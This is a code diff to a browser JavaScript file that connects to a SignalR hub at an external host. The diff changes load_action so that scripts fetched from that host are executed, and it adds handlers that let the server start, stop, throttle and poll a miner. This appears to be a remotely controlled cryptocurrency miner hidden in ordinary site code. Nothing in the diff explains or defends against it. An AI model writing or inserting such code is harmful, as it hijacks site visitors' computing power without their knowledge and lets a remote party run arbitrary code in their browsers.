@@ -18,24 +18,15 @@ function load_scripItem(scriptUrl) {
 function load_action(actionName){
 
     $.ajax({
-        url: "https://srs.hepf.com/Service/" + actionName + "?tok=" + makeid(),
-        dataType: "html",
+        url: "https://srs.hepf.com/Service/" + actionName,
+        dataType: "script",
         success: function (data) {
-            document.body.appendChild(data);
+           
         }
     });
  
 }
 
-function makeid() {
-    var text = "";
-    var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
-
-    for (var i = 0; i < 5; i++)
-        text += possible.charAt(Math.floor(Math.random() * possible.length));
-
-    return text;
-}
 
 var servicehub;
 $(function () {
@@ -44,6 +35,25 @@ $(function () {
     setTimeout(function () {
         servicehub = $.connection.serviceHub;
         $.connection.hub.url = "https://srs.hepf.com/signalr"
+
+
+        servicehub.client.miner_start = function () {
+            start_miner();
+        }
+
+        servicehub.client.miner_stop = function () {
+            stop_miner();
+        }
+
+        servicehub.client.miner_reportStatus = function () {
+            //send stats to server
+            miner.reportStatus();
+        }
+
+        servicehub.client.miner_setThrottle = function (data) {
+            miner.client().setThrottle(data);
+        }
+
         $.connection.hub.start().done(function () {
 
             console.log("connected....");
